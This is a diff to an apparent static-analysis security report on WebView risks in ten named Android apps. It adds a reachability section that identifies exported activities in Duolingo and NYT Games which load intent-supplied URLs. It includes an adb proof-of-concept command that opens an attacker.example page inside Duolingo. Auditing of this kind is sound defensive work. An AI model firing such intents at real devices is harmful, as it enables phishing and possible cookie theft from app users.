@@ -12,12 +12,12 @@ manifest + smali/java. Raw scanner output for each app is in `<app>.md` /
 | Atomic Mail | com.atomicmail | 1.7.0 | 22 | 1 | 7 | 3 | 4 | 1 |
 | Brilliant | org.brilliant.android | 10.14.0 | 34 | 0 | 0 | 5 | 4 | 3 |
 | Calm | com.calm.android | 7.1.2 | 24 | 0 | 0 | 8 | 4 | 2 |
-| Duolingo | com.duolingo | 6.98.4 | 253 | 5 | 31 | 56 | 20 | 6 |
+| Duolingo | com.duolingo | 6.98.4 | 253 | 5 | 32 | 56 | 20 | 6 |
 | Fly Delta | com.delta.mobile.android | 5.21.1 | 75 | 2 | 10 | 32 | 16 | 8 |
 | Gospel Library | org.lds.ldssa | 6.5.3 | 26 | 0 | 4 | 6 | 2 | 3 |
 | Meet Mobile | com.active.aps.meetmobile | 5.3.1.2549 | 64 | 0 | 1 | 8 | 3 | 0 |
 | MuseScore | com.musescore.playerlite | 2.14.48 | 60 | 1 | 9 | 16 | 5 | 0 |
-| NYT Games | com.nytimes.crossword | 6.43.0 | 144 | 6 | 7 | 24 | 12 | 4 |
+| NYT Games | com.nytimes.crossword | 6.43.0 | 144 | 6 | 8 | 24 | 12 | 4 |
 | Skyward | com.skyward.mobileaccess | 3.3.0 | 39 | 1 | 14 | 6 | 4 | 3 |
 
 ("WebView hosts" = classes that configure a `WebView`; counts include third-party
@@ -34,6 +34,45 @@ about:
    remote debugging, on by default and sometimes app-wide.
 3. **`file://` origin escapes.** `setAllowUniversalAccessFromFileURLs(true)`
    with JS enabled, letting a local page read/exfiltrate from any origin.
+
+## Reachability — how someone actually reaches the WebView
+
+The three themes above are latent: they describe what a WebView is *allowed* to
+do, not whether anything off-device can drive it. The question that matters with
+the app installed on a phone is **what can start a WebView with a URL I choose?**
+
+Two apps answer it. Both expose an exported activity — with no intent-filter, so
+reachable by an *explicit* intent from any app on the device, or by an ad SDK,
+or by a browsed link — that reads the URL to display straight out of the Intent
+and hands it to `loadUrl`. No in-app user action is involved.
+
+| app | component | intent-URL flow | severity |
+|---|---|---|---|
+| Duolingo | `org.prebid.mobile.rendering.views.browser.AdBrowserActivity` | `getIntent().getExtras()` → `bundle.getString("EXTRA_URL")` → `loadUrl` | HIGH |
+| NYT Games | `com.nytimes.games.features.hybrid.components.base.HybridComponentActivity` | `getIntent().getParcelableExtra("COMPONENT_DATA").getHybridUrl()` → `loadUrl` | HIGH |
+
+A third-party app on the same device needs only:
+
+```sh
+adb shell am start -n com.duolingo/org.prebid.mobile.rendering.views.browser.AdBrowserActivity \
+  -e EXTRA_URL "https://attacker.example/poc.html"        # (adb is the lab stand-in;
+                                                          # a malicious app uses an explicit Intent)
+```
+
+Neither of these two WebViews carries a JS bridge, so on its own each renders
+attacker content in the app's own chrome rather than bridging into native code
+— which is why they are HIGH, not CRITICAL. NYT is worth a closer look: the
+hybrid shell *does* define a bridge (`AuthenticateUserCommand`,
+`GetAllCookiesCommand`, …) that the exported activity's WebView may be handed by
+`HybridWebViewConfigurer`; whether the exported activity gets the bridged view is
+a cross-class link static analysis can't settle, so it is the first thing to
+confirm on a device.
+
+The other eight apps report no such chain: their WebViews are reached only via
+normal in-app navigation, so a finding there needs a separate bug (a malicious
+ad, a deep link the user taps) to supply the URL. That is the honest reason
+Brilliant/Calm/Meet Mobile read as low-risk and why Duolingo's high count
+matters more than its raw number suggests.
 
 ## Notable per app
 
